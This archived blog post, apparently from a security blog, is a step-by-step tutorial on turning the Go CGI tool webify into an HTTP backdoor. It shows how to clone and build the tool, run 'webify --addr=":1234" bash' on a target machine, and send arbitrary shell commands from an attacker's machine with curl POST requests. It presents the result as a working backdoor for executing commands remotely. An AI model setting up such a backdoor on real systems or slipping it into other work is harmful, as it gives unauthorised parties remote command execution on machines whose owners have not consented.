---
layout: post
title: "HTTP BACKDOOR USING WEBIFY"
date: 2021-01-10T00:26:00+05:30
categories: ["Hacking"]
description: "This article discusses about using GoLang tool webify to establish a simple HTTP backdoor that listens on a port and executes remote commands sent over. There are lots of tools"
original_url: "https://blog.alphathreat.in/index.php?post/2021/01/10/HTTP-backdoor-using-webify"
---

This article discusses about using GoLang tool **webify** to establish a simple HTTP **backdoor** that listens on a port  and executes **remote commands** sent over.

There are lots of tools and techniques out there, but it is always helpful to know your alternatives.

`Webify` invokes your script and writes the request body to your process' stdin. Stdout is then passed back to the client as the HTTP response body.`Webify` is a very basic CGI server which forwards all requests to a single script.

Since this tool is written in Golang, no doubt you should have it installed to run. You can follow the instruction provided here https://golang.org/doc/install

You can obtain your copy of Webify from https://github.com/beefsack/webify/releases

or simply do git clone in terminal to build from source

```

git clone https://github.com/beefsack/webify
```

Once the folder is cloned go to the directory via cd

```

cd webify
```

Now execute the main file by:

```

go run main.go
```

Finally build the executable by

```

go build
```

this will build the webify executable in same folder

<p class="img-missing" role="note"><strong>Screenshot unavailable</strong> — <code>webify.png</code> was not captured by the Internet Archive.</p>

The other usage examples are provided in the github page itself, let us just jump into our backdoor creation.

On the target machine execute the webify, this will listen on port 8080 by default. For the demo I am hereby executing this in localhost. You can change the default port by providing **--addr=":PORT"** option. Execute the webify and send the input stream received to bash by

```

webify  --addr=":1234" bash
```

Now from attackers machine you can send the commands over POST requests and receive output. I am using curl for the same purpose. **-d** option in curl  is used to send data by POST method

**curl -d "COMMAND TO EXEECUTE" IP:PORT**

curl -d "ls -la" http://localhost:1234

<p class="img-missing" role="note"><strong>Screenshot unavailable</strong> — <code>webify_rshell.png</code> was not captured by the Internet Archive.</p>

Now we have a fully working HTTP backdoor established on target machine listening on port 1234 ready to execute our shell commands
